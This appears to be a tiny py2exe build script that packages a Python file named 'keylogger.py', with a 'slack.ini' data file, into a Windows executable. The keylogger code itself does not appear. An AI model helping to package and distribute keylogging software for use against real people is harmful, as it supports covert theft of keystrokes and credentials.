from distutils.core import setup
import py2exe

setup(console=['keylogger.py'],
	data_files=['slack.ini']
	)
